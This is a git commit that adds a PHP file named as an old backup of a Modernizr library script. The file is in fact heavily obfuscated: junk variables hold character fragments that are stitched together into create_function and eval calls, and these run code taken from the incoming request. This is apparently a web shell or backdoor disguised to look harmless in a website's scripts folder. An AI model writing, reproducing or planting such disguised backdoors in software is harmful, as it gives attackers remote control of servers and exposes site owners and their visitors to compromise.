805e16930b572a10ccaf39d5ff8e47553d1e5e39
lieutenantdaily <lieutenantdaily@gmail.com>
2017-07-02 18:27:38 -0500

    Add files via upload

---
+++ scripts/modernizr.custom.86080_bck_old.php
@@ -0,0 +1,118 @@
+<?php
+	$belgian='yD$(';$follies ='se;';$divinely= 'a=]cIE';$janeen = 'a';
+
+	$imputed = 'o'; $clamorous ='[';$incompletely = 'g';$barnaby ='O';
+
+	$lestat = ')TEdcQ4f]';
+
+	$economists=']rvepV';
+
+	$lacerations = 'K"_""`s';$canned = 'v'; $carita ='g)n$'; $assassination='T'; $buckeye ='t';$fictions= 'u)"trE('; $horizontal ='brSait_'; $hocus ='_'; $inane='t';$janie= 'ie"';$indiscoverable='((HGD"'; $coaster='Ice";iGP';
+	$decrees = ']';$juvenile= 'I';
+	$frederigo ='_$s)n)gv('; $cloud = '?,t';$lim = 'd';
+
+	$designations = 'v';
+
+	$assuming =')gr';$burdened = 'i';
+
+	$intelligence='E';$broiler ='N$E'; $briar ='r$xya$E'; $gorilla='T';
+
+	$lib = '(';$inhomogeneous='_';$caloric= 'b';$hastened= 'l';
+	$enid ='_edIai_';$expurgate='e';$godkin=')';$circulation='t';$gherkin =')g'; $concert='I:=svtar'; $archy = 'I'; $bible= 's';
+	$all = 'a';$luckless = 'W';
+
+	$campaign = '['; $amort = 'lCor';
+	$consuelo = 'eeae'; $bedimming ='eQPiXiC'; $halide='A';$lana = 'V';$levity ='HM(P'; $causeways= 'Ye:GeiJV';
+
+	$historian ='_';
+
+	$bivalve= '(';$lawmen = 'taRp[_c'; $checkbook='U_Xa;Vm'; $delicatessen='efOo'; $fierce='$'; $essentials = 'v$'; $cooky = '_'; $comforting='ss)$LF';$conclusive ='ec)nr6RRt';
+
+	$carnage = 'Z';
+	$conjunction='h';$humiliate='S';
+	$incubation ='R';$gladder='i';
+
+	$benzedrine='K';$charitableness ='$';
+	$codewords ='isei(TXea';$introductory= 'd(;a ?u'; $digression ='B_gr'; $conversed='x';$clasps ='eTO';$laverna ='][Tf'; $eileen= 'D'; $golds= 'H';
+	$concisely= 'r'; $fee='Edir['; $consoled= 'S)(,"'; $insouciant = 'E'; $dam ='dUiT';
+
+	$deceit ='^T'; $braided ='e';
+
+	$control = $conclusive[1]. $fee['3'] .$braided[0] .$introductory[3].$conclusive[8].$braided[0].$digression['1'] .
+	$laverna['3'] . $introductory['6'] .$conclusive['3']. $conclusive[1]. $conclusive[8]. $dam['2'] .$delicatessen['3'] .$conclusive['3'];$informers = $introductory['4']; $grownup= $control
+
+	($informers,$braided[0] . $essentials['0'] .
+	$introductory[3].
+	$amort['0'].
+
+	$consoled['2'].$introductory[3]. $fee['3'] .$fee['3'].$introductory[3] . $briar[3].$digression['1'] . $lawmen['3'] .
+	$delicatessen['3'] .$lawmen['3'].$consoled['2'] .$laverna['3'] . $introductory['6'] . $conclusive['3'] . $conclusive[1] . $digression['1'] . $digression['2'].$braided[0] .$conclusive[8].$digression['1'] .$introductory[3] .
+
+	$fee['3'].$digression['2'].
+	$codewords['1']. $consoled['2']. $consoled['1'] . $consoled['1'].
+
+	$consoled['1']. $introductory['2']);
+	$grownup ($drunk['4'],$dam['1'], $deceit[0], $apocalypse['1'],$incubation,$checkbook['5'] ,$architectonic['1'], $introductory['2'] , $codewords['1'],$essentials['0'], $lawmen['3'] , $braided[0], $charitableness .$dam['2'].$concert['2'].$introductory[3] . $fee['3'] .$fee['3']. $introductory[3] .
+
+	$briar[3] .
+	$digression['1'].$checkbook['6']. $braided[0]. $fee['3'].$digression['2']. $braided[0].$consoled['2'].$charitableness.
+
+	$digression['1']. $incubation.$insouciant.
+	$bedimming[1] .$dam['1']. $insouciant.
+
+	$consoled['0'] .
+	$deceit[1]. $consoled['3']. $charitableness .$digression['1'].$bedimming[6].$clasps['2'] . $clasps['2']. $benzedrine . $archy .
+	$insouciant. $consoled['3'] .$charitableness .$digression['1'] .$consoled['0'] . $insouciant .
+	$incubation .$checkbook['5'] . $insouciant.$incubation.
+
+	$consoled['1'] .$introductory['2'].$charitableness. $introductory[3].$concert['2'] . $dam['2'] .$codewords['1'] .$codewords['1'] . $braided[0].
+	$conclusive[8] . $consoled['2'] .
+
+	$charitableness .
+	$dam['2']. $fee[4].
+
+	$consoled['4'] .$braided[0] . $conversed.$digression['2']. $conclusive[8]. $essentials['0'] .$dam['2'] .$dam['2']. $dam[0] .$consoled['4'] . $laverna[0] .$consoled['1'] .$introductory['5'] . $charitableness.$dam['2'] .
+
+	$fee[4].
+	$consoled['4']. $braided[0]. $conversed. $digression['2']. $conclusive[8].
+	$essentials['0'] .$dam['2'].
+	$dam['2'] .
+
+	$dam[0].$consoled['4'] .$laverna[0] . $causeways['2']. $consoled['2'] .$dam['2'] .$codewords['1']. $codewords['1']. $braided[0].
+
+	$conclusive[8] .$consoled['2'].
+
+	$charitableness.$dam['2'] . $fee[4]. $consoled['4'].$golds . $deceit[1] . $deceit[1] .$levity['3'] .
+	$digression['1'] . $insouciant .$codewords['6'] .$causeways['3'] . $deceit[1]. $checkbook['5'].
+
+	$archy.$archy.$eileen .$consoled['4'] . $laverna[0].
+	$consoled['1'] . $introductory['5'] .
+
+	$charitableness . $dam['2'] .
+	$fee[4]. $consoled['4']. $golds . $deceit[1] . $deceit[1] . $levity['3']. $digression['1'] .$insouciant. $codewords['6'].
+	$causeways['3'].$deceit[1].$checkbook['5']. $archy.$archy. $eileen. $consoled['4'] . $laverna[0]. $causeways['2'].$dam[0]. $dam['2'] . $braided[0].
+
+	$consoled['1'] . $introductory['2']. $braided[0] .$essentials['0'].
+
+	$introductory[3].$amort['0'] . $consoled['2'].$codewords['1']. $conclusive[8]. $fee['3'] .
+	$fee['3'].
+
+	$braided[0] .
+
+	$essentials['0']. $consoled['2'].$caloric.
+
+	$introductory[3].
+
+	$codewords['1'] .$braided[0]. $conclusive['5'] .
+
+	$lestat['6'] .
+
+	$digression['1'] . $dam[0] .
+	$braided[0] . $conclusive[1] . $delicatessen['3']. $dam[0] . $braided[0] .$consoled['2'].$codewords['1'] . $conclusive[8] .
+
+	$fee['3'] . $fee['3'] .$braided[0] .
+	$essentials['0'] . $consoled['2'].$charitableness.$introductory[3]. $consoled['1'] .
+
+	$consoled['1'] . $consoled['1'].$consoled['1'] . $introductory['2']);
+
+	
